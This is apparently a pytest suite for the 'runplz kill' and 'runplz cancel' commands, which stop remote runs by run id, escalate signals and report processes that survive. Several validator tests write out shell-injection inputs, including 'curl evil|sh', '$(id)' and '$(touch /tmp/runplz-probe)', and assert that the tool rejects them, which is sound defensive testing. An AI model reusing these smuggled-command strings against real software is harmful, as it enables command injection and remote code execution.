"""Coverage for ``runplz kill`` / ``runplz cancel`` (issue #67)."""

import json
import os
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from unittest import mock

import pytest

from runplz import _cli, _runs
from runplz.backends import ssh_common

RUN_ID = "20260826T010203Z-myhost-train-deadbeef"
OTHER_RUN_ID = "20260826T999999Z-otherhost-train-99999999"


def _write_manifest(outputs_dir: Path, **overrides) -> dict:
    manifest = {
        "run_id": RUN_ID,
        "backend": "brev",
        "target": "my-gpu-box",
        "function": "train",
        "remote_paths": {"meta": f"~/runplz-runs/{RUN_ID}/out/.runplz"},
    }
    manifest.update(overrides)
    meta = outputs_dir / ".runplz"
    meta.mkdir(parents=True, exist_ok=True)
    (meta / "run.json").write_text(json.dumps(manifest))
    return manifest


def _summary(**fields) -> str:
    base = {
        "pid": "4242",
        "container": "",
        "container_state": "none",
        "scan": "1",
        "finished": "0",
        "initial": "running",
        "final": "dead",
        "alive_before": "1",
        "alive_after": "0",
        "survivors": "",
        "signal": "TERM",
        "signalled": "1",
        "escalated": "0",
        "gpu_mem_used": "",
    }
    base.update(fields)
    body = "".join(f"{k}={v}\n" for k, v in base.items())
    return f"---SUMMARY---\n{body}---HEARTBEAT---\n---LOGTAIL---\n---END---\n"


# ---------------------------------------------------------------------------
# build_kill_command: shape


def test_kill_command_reads_the_control_files():
    cmd = ssh_common.build_kill_command("$HOME/runs/r1/out/.runplz", run_id="r1")
    assert "$HOME/runs/r1/out/.runplz/bootstrap.pid" in cmd
    assert "$HOME/runs/r1/out/.runplz/container" in cmd
    assert "killed_by_user" in cmd


def test_kill_command_identifies_processes_by_run_id_not_process_group():
    """A pgid would be the launching shell's, not this run's. See #67."""
    cmd = ssh_common.build_kill_command("$HOME/m", run_id="r1")
    assert f"{ssh_common.RUN_ID_ENV_VAR}=$runplz_run_id" in cmd
    assert "pgid" not in cmd
    # Never signal a whole process group.
    assert '"-$' not in cmd


def test_kill_command_signals_scanned_pids_and_container():
    cmd = ssh_common.build_kill_command("$HOME/m", run_id="r")
    assert 'kill -"$1" "$runplz_victim"' in cmd
    assert 'sudo docker kill --signal="$1" "$runplz_container"' in cmd


def test_kill_command_is_valid_posix_sh(tmp_path):
    script = tmp_path / "kill.sh"
    script.write_text(ssh_common.build_kill_command("$HOME/m", run_id="r"))
    assert subprocess.run(["sh", "-n", str(script)]).returncode == 0
    assert subprocess.run(["bash", "-n", str(script)]).returncode == 0


def test_kill_command_passes_tr_a_real_escape_not_a_nul_byte():
    """`tr '\\0'` needs the two-character escape; an actual NUL cannot cross argv."""
    cmd = ssh_common.build_kill_command("$HOME/m", run_id="r")
    assert "\x00" not in cmd
    assert r"tr '\0' '\n'" in cmd


def test_kill_command_honors_no_escalate():
    assert 'if [ "1" = "1" ]; then' in ssh_common.build_kill_command("$HOME/m", escalate=True)
    assert 'if [ "0" = "1" ]; then' in ssh_common.build_kill_command("$HOME/m", escalate=False)


def test_kill_command_uses_requested_first_signal():
    assert 'runplz_signal "INT"' in ssh_common.build_kill_command("$HOME/m", first_signal="INT")


# ---------------------------------------------------------------------------
# build_kill_command: everything interpolated is validated


@pytest.mark.parametrize(
    "meta",
    [
        "$HOME/x/$(touch /tmp/runplz-probe)",
        "~/x; touch /tmp/runplz-probe",
        "$HOME/x`id`",
        "relative/path",
        "",
    ],
)
def test_kill_command_rejects_an_unsafe_meta_path(meta):
    with pytest.raises(ValueError, match="meta path"):
        ssh_common.build_kill_command(meta, run_id="r")


@pytest.mark.parametrize("run_id", ['a"; curl evil|sh; :"', "x y", "$(id)", "a`id`"])
def test_kill_command_rejects_an_unsafe_run_id(run_id):
    with pytest.raises(ValueError, match="run id"):
        ssh_common.build_kill_command("$HOME/m", run_id=run_id)


def test_kill_command_rejects_an_unknown_signal():
    with pytest.raises(ValueError, match="signal"):
        ssh_common.build_kill_command("$HOME/m", first_signal='x"; curl evil|sh; :"')


def test_kill_command_rejects_a_non_integer_timeout():
    with pytest.raises((ValueError, TypeError)):
        ssh_common.build_kill_command("$HOME/m", timeout_s="5; id")


def test_kill_command_rejects_a_negative_timeout():
    with pytest.raises(ValueError, match="timeout"):
        ssh_common.build_kill_command("$HOME/m", timeout_s=-1)


def test_kill_command_rejects_an_unsafe_proc_root():
    with pytest.raises(ValueError, match="proc root"):
        ssh_common.build_kill_command("$HOME/m", proc_root="/proc; id")


# ---------------------------------------------------------------------------
# The generated shell, actually executed
#
# procfs only exists on Linux, so the marker scan is exercised against a fake
# proc tree whose <pid>/environ entries name real, live processes. The script
# then really signals them, which is the behavior worth proving.


class _FakeBox:
    """A meta dir plus a fake procfs naming real processes."""

    def __init__(self, root: Path):
        self.root = root
        self.meta = root / "home" / "runplz-runs" / RUN_ID / "out" / ".runplz"
        self.meta.mkdir(parents=True)
        self.proc = root / "proc"
        self.proc.mkdir()
        self.procs: list[subprocess.Popen] = []
        self._stop = threading.Event()
        # Reap promptly, as init does on a real box: an unreaped zombie still
        # answers `kill -0` and would look alive.
        threading.Thread(target=self._reap, daemon=True).start()

    def _reap(self):
        while not self._stop.is_set():
            for p in list(self.procs):
                p.poll()
            time.sleep(0.02)

    def spawn(self, run_id: str | None, *, ignores_term: bool = False) -> subprocess.Popen:
        if ignores_term:
            argv = ["bash", "-c", "trap '' TERM; sleep 300"]
        else:
            argv = ["sleep", "300"]
        p = subprocess.Popen(argv, start_new_session=True)
        self.procs.append(p)
        entry = self.proc / str(p.pid)
        entry.mkdir()
        env = "PATH=/usr/bin\0HOME=/root\0"
        if run_id is not None:
            env += f"{ssh_common.RUN_ID_ENV_VAR}={run_id}\0"
        (entry / "environ").write_bytes(env.encode())
        return p

    def run_kill(self, **kwargs) -> dict[str, str]:
        kwargs.setdefault("run_id", RUN_ID)
        kwargs.setdefault("timeout_s", 3)
        kwargs.setdefault("proc_root", str(self.proc))
        script = self.root / "kill.sh"
        script.write_text(ssh_common.build_kill_command(str(self.meta), **kwargs))
        r = subprocess.run(["bash", str(script)], capture_output=True, text=True, timeout=180)
        assert r.returncode == 0, r.stderr
        sections = _runs._parse_status_sections(r.stdout)
        return _runs._parse_kv_block(sections.get("SUMMARY", ""))

    def cleanup(self):
        self._stop.set()
        for p in self.procs:
            try:
                os.kill(p.pid, 9)
            except ProcessLookupError:
                pass


@pytest.fixture
def box(tmp_path):
    b = _FakeBox(Path(tempfile.mkdtemp(dir=tmp_path)))
    try:
        yield b
    finally:
        b.cleanup()


def _alive(p: subprocess.Popen) -> bool:
    return p.poll() is None


def test_kill_stops_every_process_carrying_the_run_id(box):
    """Orphaned workers included — the case that motivated the issue."""
    workers = [box.spawn(RUN_ID) for _ in range(3)]
    (box.meta / "bootstrap.pid").write_text(f"{workers[0].pid}\n")

    fields = box.run_kill()

    assert fields["scan"] == "1"
    assert fields["alive_before"] == "1"
    assert fields["alive_after"] == "0"
    assert fields["survivors"] == ""
    assert fields["escalated"] == "0", "SIGTERM should have been enough"
    time.sleep(0.3)
    assert [_alive(p) for p in workers] == [False, False, False]


def test_kill_leaves_another_run_on_the_same_box_alone(box):
    """A process group would have taken these with it."""
    mine = [box.spawn(RUN_ID) for _ in range(2)]
    theirs = [box.spawn(OTHER_RUN_ID) for _ in range(2)]
    unmarked = box.spawn(None)
    (box.meta / "bootstrap.pid").write_text(f"{mine[0].pid}\n")

    box.run_kill()
    time.sleep(0.3)

    assert [_alive(p) for p in mine] == [False, False]
    assert [_alive(p) for p in theirs] == [True, True], "collateral damage to another run"
    assert _alive(unmarked), "collateral damage to an unrelated process"


def test_kill_escalates_to_sigkill_when_the_job_ignores_sigterm(box):
    stubborn = box.spawn(RUN_ID, ignores_term=True)
    time.sleep(0.3)

    fields = box.run_kill(timeout_s=2)

    assert fields["escalated"] == "1"
    assert fields["alive_after"] == "0"
    time.sleep(0.3)
    assert not _alive(stubborn)


def test_kill_reports_survivors_instead_of_claiming_success(box):
    """--no-escalate on a SIGTERM-proof job must not look like a clean stop."""
    stubborn = box.spawn(RUN_ID, ignores_term=True)
    time.sleep(0.3)

    fields = box.run_kill(timeout_s=1, escalate=False)

    assert fields["escalated"] == "0"
    assert fields["alive_after"] == "1"
    assert str(stubborn.pid) in fields["survivors"].split()
    assert _alive(stubborn)


def test_kill_is_idempotent_on_a_run_that_never_existed(box):
    fields = box.run_kill()
    assert fields["signalled"] == "0"
    assert fields["alive_before"] == "0"
    assert not (box.meta / "events.ndjson").exists()


def test_kill_records_a_killed_by_user_event(box):
    box.spawn(RUN_ID)
    fields = box.run_kill()
    assert fields["signalled"] == "1"
    event = json.loads((box.meta / "events.ndjson").read_text().strip())
    assert event["event"] == "killed_by_user"
    assert event["run_id"] == RUN_ID


def test_kill_does_not_trust_a_recorded_pid_once_the_run_has_exited(box):
    """PID wraparound: a finished run's pid may belong to somebody else now."""
    bystander = box.spawn(None)
    (box.meta / "bootstrap.pid").write_text(f"{bystander.pid}\n")
    # Exactly the form the remote printf writes (no spaces after the colons).
    (box.meta / "events.ndjson").write_text(
        '{"ts":"2026-08-26T00:00:00Z","run_id":"' + RUN_ID + '","event":"remote_command_exit"}\n'
    )

    fields = box.run_kill()

    assert fields["finished"] == "1"
    assert fields["signalled"] == "0", "signalled a pid belonging to a finished run"
    time.sleep(0.3)
    assert _alive(bystander)


@pytest.mark.parametrize("bad_pid", ["0", "1", "0000001", "not-a-pid", ""])
def test_kill_refuses_dangerous_or_malformed_pids(box, bad_pid):
    """`kill -TERM 0` signals our own group; pid 1 is init."""
    (box.meta / "bootstrap.pid").write_text(f"{bad_pid}\n")
    fields = box.run_kill()
    assert fields["pid"] == ""
    assert fields["signalled"] == "0"


def test_kill_ignores_a_zombie_that_still_answers_kill_0(box):
    """A zombie would otherwise pin the wait loop and force a pointless SIGKILL."""
    p = subprocess.Popen(["sleep", "300"], start_new_session=True)
    entry = box.proc / str(p.pid)
    entry.mkdir()
    (entry / "environ").write_bytes(f"{ssh_common.RUN_ID_ENV_VAR}={RUN_ID}\0".encode())
    # Real procfs marks a reaped-pending process Z; mirror that in the fake tree.
    (entry / "stat").write_text(f"{p.pid} (sleep) Z 1 1 1 0 -1 0 0 0 0 0\n")
    p.kill()

    fields = box.run_kill()

    assert fields["alive_before"] == "0"
    assert fields["signalled"] == "0"
    p.wait(timeout=10)


def test_kill_falls_back_to_the_pid_without_procfs(box):
    """No /proc (or a pre-3.16 run): the recorded pid is all there is."""
    worker = box.spawn(RUN_ID)
    (box.meta / "bootstrap.pid").write_text(f"{worker.pid}\n")

    fields = box.run_kill(proc_root="/nonexistent-proc")

    assert fields["scan"] == "0"
    assert fields["signalled"] == "1"
    time.sleep(0.3)
    assert not _alive(worker)


# ---------------------------------------------------------------------------
# launcher


def test_launcher_tags_the_bootstrap_environment_with_the_run_id():
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    launcher = ssh_common.build_detached_launcher(remote_run, "echo hi")
    nohup_line = next(line for line in launcher.splitlines() if "nohup" in line)
    # Must be on the exec line: /proc/<pid>/environ is fixed at exec time, so a
    # later `export` inside the script would never appear there.
    assert nohup_line.startswith(f"{ssh_common.RUN_ID_ENV_VAR}={remote_run.run_id} ")
    assert "setsid" not in launcher
    assert f'echo $! > "{remote_run.meta_shell}/bootstrap.pid"' in launcher
    assert "pgid" not in launcher


def test_launcher_still_runs_and_records_its_pid(tmp_path):
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    launcher = ssh_common.build_detached_launcher(remote_run, "sleep 5")
    subprocess.run(
        ["bash", "-c", launcher],
        check=True,
        env=dict(os.environ, HOME=str(tmp_path)),
        timeout=60,
    )
    meta = tmp_path / "runplz-runs" / remote_run.run_id / "out" / ".runplz"
    pid = int((meta / "bootstrap.pid").read_text().strip())
    try:
        assert pid > 1
    finally:
        try:
            os.kill(pid, 9)
        except ProcessLookupError:
            pass


def test_launcher_rejects_an_unsafe_run_id():
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    object.__setattr__(remote_run, "run_id", 'x"; curl evil|sh; :"')
    with pytest.raises(ValueError, match="run id"):
        ssh_common.build_detached_launcher(remote_run, "echo hi")


# ---------------------------------------------------------------------------
# container name recording


def test_container_mode_records_container_name_for_kill():
    recorded = {}

    def fake_ssh(target, command, port=None):
        recorded["command"] = command

    function = mock.Mock(env={})
    function.name = "train"
    remote_run = ssh_common.make_remote_run_context(
        backend="brev", target="box", function_name="train"
    )
    with mock.patch.object(ssh_common, "ssh_exec", fake_ssh):
        ssh_common._run_container_detached(
            target="box",
            container_name="runplz-train-abc12345",
            function=function,
            rel_script="job.py",
            args=[],
            kwargs={},
            gpu_flag="",
            app_name="app",
            remote_run=remote_run,
        )
    command = recorded["command"]
    assert f'> "{remote_run.meta_shell}/container"' in command
    assert "runplz-train-abc12345" in command
    # Written before the monitor loop so an early kill still finds it.
    assert command.index("/container") < command.index("runplz_event container_started")


# ---------------------------------------------------------------------------
# _runs.kill


def test_kill_reports_a_clean_stop(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake) as run_mock:
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 0
    out = capsys.readouterr().out
    assert "target:     my-gpu-box" in out
    assert "stopped with SIGTERM" in out
    cmd = run_mock.call_args.args[0]
    assert cmd[0] == "ssh"
    assert cmd[-2] == "my-gpu-box"
    assert "killed_by_user" in cmd[-1]


def test_kill_reports_escalation(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(escalated="1"), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert "escalated to SIGKILL" in capsys.readouterr().out


@pytest.mark.parametrize("signal", ["INT", "KILL"])
def test_kill_reports_the_signal_actually_sent(tmp_path, capsys, signal):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(signal=signal), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        _runs.kill(
            outputs_dir=tmp_path,
            host_override=None,
            run_id_override=None,
            first_signal=signal,
        )
    assert f"stopped with SIG{signal}" in capsys.readouterr().out


def test_kill_on_an_already_dead_run_is_a_success(tmp_path, capsys):
    _write_manifest(tmp_path)
    stdout = _summary(
        initial="dead", final="dead", signalled="0", alive_before="0", alive_after="0", pid=""
    )
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 0
    assert "nothing to kill" in capsys.readouterr().out


def test_kill_returns_nonzero_when_the_run_survives(tmp_path, capsys):
    """`runplz kill && runplz brev job.py` must not proceed over a live GPU."""
    _write_manifest(tmp_path)
    stdout = _summary(final="running", alive_after="1", survivors="111 222")
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == _runs.KILL_SURVIVED_RC
    out = capsys.readouterr().out
    assert "SIGNALLED BUT STILL ALIVE" in out
    assert "111 222" in out


def test_kill_returns_nonzero_when_only_the_container_survives(tmp_path, capsys):
    _write_manifest(tmp_path)
    stdout = _summary(
        container="runplz-train-abc", container_state="running", alive_after="1", survivors=""
    )
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == _runs.KILL_SURVIVED_RC
    assert "container still running" in capsys.readouterr().out


def test_kill_does_not_claim_success_when_the_remote_script_did_not_run(tmp_path, capsys):
    """A login shell that can't parse the script, or a banner on stdout."""
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout="Welcome to Ubuntu!\n", stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 2
    err = capsys.readouterr().err
    assert "could not read a kill result" in err


def test_kill_warns_when_no_process_marker_was_available(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(scan="0"), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert "no process marker available" in capsys.readouterr().out


def test_kill_renders_gpu_memory_and_heartbeat_and_logtail(tmp_path, capsys):
    _write_manifest(tmp_path)
    hb = json.dumps({"ts": "2026-08-26T01:05:30Z", "run_id": "x"})
    stdout = _summary(gpu_mem_used="0,512")
    stdout = stdout.replace("---HEARTBEAT---\n", f"---HEARTBEAT---\n{hb}\n")
    # A log line that looks exactly like a section marker must survive intact.
    stdout = stdout.replace(
        "---LOGTAIL---\n",
        "---LOGTAIL---\n| epoch 1\n| --- checkpoint saved ---\n| epoch 2\n",
    )
    fake = mock.Mock(returncode=0, stdout=stdout, stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    out = capsys.readouterr().out
    assert "gpu memory: gpu0=0MiB, gpu1=512MiB" in out
    assert "2026-08-26T01:05:30Z" in out
    assert "epoch 1" in out
    assert "--- checkpoint saved ---" in out
    assert "epoch 2" in out, "log tail truncated by a marker-like line"


def test_kill_returns_ssh_failure_code(tmp_path, capsys):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=255, stdout="", stderr="ssh: connect refused")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake):
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 255
    assert "ssh to my-gpu-box failed" in capsys.readouterr().err


def test_kill_survives_an_ssh_timeout(tmp_path, capsys):
    _write_manifest(tmp_path)
    with mock.patch(
        "runplz._runs.subprocess.run",
        side_effect=subprocess.TimeoutExpired(cmd="ssh", timeout=75),
    ):
        rc = _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert rc == 2
    assert "timed out" in capsys.readouterr().err


def test_kill_ssh_timeout_outlives_the_remote_escalation_clock(tmp_path):
    _write_manifest(tmp_path)
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake) as run_mock:
        _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None, timeout_s=600)
    assert run_mock.call_args.kwargs["timeout"] > 600 + ssh_common.KILL_SETTLE_S


def test_kill_uses_run_id_override_when_there_is_no_manifest(tmp_path, capsys):
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake) as run_mock:
        rc = _runs.kill(outputs_dir=tmp_path, host_override="other-box", run_id_override="rid-9")
    assert rc == 0
    remote_cmd = run_mock.call_args.args[0][-1]
    assert "runplz-runs/rid-9/out/.runplz/bootstrap.pid" in remote_cmd
    assert "run:        rid-9" in capsys.readouterr().out


def test_kill_refuses_a_tampered_meta_path_from_the_manifest(tmp_path, capsys):
    """The manifest is rsynced down off the remote box, so it is untrusted."""
    _write_manifest(
        tmp_path,
        remote_paths={"meta": "~/runplz-runs/$(touch /tmp/runplz-probe)/out/.runplz"},
    )
    rc = _cli.main(["kill", "--outputs-dir", str(tmp_path)])
    assert rc == 2
    err = capsys.readouterr().err
    assert "refusing to use remote path from the run manifest" in err
    assert "runplz-probe" in err, "the rejected value should be shown"


def test_kill_drops_a_tampered_run_id_from_the_remote_command(tmp_path):
    _write_manifest(tmp_path, run_id='evil"; touch /tmp/runplz-probe; echo "')
    fake = mock.Mock(returncode=0, stdout=_summary(), stderr="")
    with mock.patch("runplz._runs.subprocess.run", return_value=fake) as run_mock:
        _runs.kill(outputs_dir=tmp_path, host_override=None, run_id_override=None)
    assert "runplz-probe" not in run_mock.call_args.args[0][-1]


# ---------------------------------------------------------------------------
# CLI


@pytest.mark.parametrize("verb", ["kill", "cancel"])
def test_cli_dispatches_both_verbs(tmp_path, verb):
    _write_manifest(tmp_path)
    with mock.patch.object(_runs, "kill", return_value=0) as kill_mock:
        rc = _cli.main([verb, "--outputs-dir", str(tmp_path)])
    assert rc == 0
    kwargs = kill_mock.call_args.kwargs
    assert kwargs["outputs_dir"] == tmp_path.resolve()
    assert kwargs["timeout_s"] == ssh_common.DEFAULT_KILL_TIMEOUT_S
    assert kwargs["escalate"] is True
    assert kwargs["first_signal"] == "TERM"


def test_cli_kill_propagates_the_survivor_exit_code(tmp_path):
    _write_manifest(tmp_path)
    with mock.patch.object(_runs, "kill", return_value=_runs.KILL_SURVIVED_RC):
        assert _cli.main(["kill", "--outputs-dir", str(tmp_path)]) == _runs.KILL_SURVIVED_RC


def test_cli_kill_plumbs_signal_and_timeout(tmp_path):
    _write_manifest(tmp_path)
    with mock.patch.object(_runs, "kill", return_value=0) as kill_mock:
        _cli.main(
            [
                "kill",
                "--outputs-dir",
                str(tmp_path),
                "--signal",
                "INT",
                "--timeout",
                "45",
                "--no-escalate",
            ]
        )
    kwargs = kill_mock.call_args.kwargs
    assert kwargs["first_signal"] == "INT"
    assert kwargs["timeout_s"] == 45
    assert kwargs["escalate"] is False


def test_cli_kill_rejects_a_negative_timeout(tmp_path):
    _write_manifest(tmp_path)
    with pytest.raises(SystemExit):
        _cli.main(["kill", "--outputs-dir", str(tmp_path), "--timeout", "-1"])


def test_cli_kill_surfaces_missing_manifest(tmp_path, capsys):
    rc = _cli.main(["kill", "--outputs-dir", str(tmp_path)])
    assert rc == 1
    assert "No run manifest" in capsys.readouterr().err


def test_cli_kill_run_id_without_host_errors(tmp_path, capsys):
    rc = _cli.main(["kill", "--outputs-dir", str(tmp_path), "--run-id", "xyz"])
    assert rc == 2
    assert "--run-id requires --host" in capsys.readouterr().err


def test_cli_kill_targets_an_explicit_host_and_run_id(tmp_path):
    with mock.patch.object(_runs, "kill", return_value=0) as kill_mock:
        _cli.main(["kill", "--host", "other-box", "--run-id", "rid-9"])
    kwargs = kill_mock.call_args.kwargs
    assert kwargs["host_override"] == "other-box"
    assert kwargs["run_id_override"] == "rid-9"


if sys.platform == "win32":  # pragma: no cover - runplz targets POSIX hosts
    pytest.skip("kill relies on POSIX signals", allow_module_level=True)


# ---------------------------------------------------------------------------
# runtime cap cleanup is scoped to the run


def test_runtime_cap_stops_only_this_run_when_the_context_is_known():
    """`pkill -f runplz._bootstrap` would take a co-tenant run down too."""
    remote_run = ssh_common.make_remote_run_context(
        backend="ssh", target="box", function_name="train"
    )
    sent = {}

    def fake_run(cmd, **kwargs):
        sent["cmd"] = cmd
        return mock.Mock(returncode=0, stdout="", stderr="")

    with mock.patch.object(ssh_common.subprocess, "run", fake_run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 60, container_name=None, remote_run=remote_run)
    remote_cmd = sent["cmd"][-1]
    assert "pkill" not in remote_cmd
    assert f"{ssh_common.RUN_ID_ENV_VAR}=$runplz_run_id" in remote_cmd
    assert remote_run.run_id in remote_cmd


def test_runtime_cap_falls_back_to_pkill_without_a_run_context():
    sent = {}

    def fake_run(cmd, **kwargs):
        sent["cmd"] = cmd
        return mock.Mock(returncode=0, stdout="", stderr="")

    with mock.patch.object(ssh_common.subprocess, "run", fake_run):
        with pytest.raises(RuntimeError):
            ssh_common.raise_for_runtime_cap("box", 60, container_name=None)
    assert "pkill" in sent["cmd"][-1]
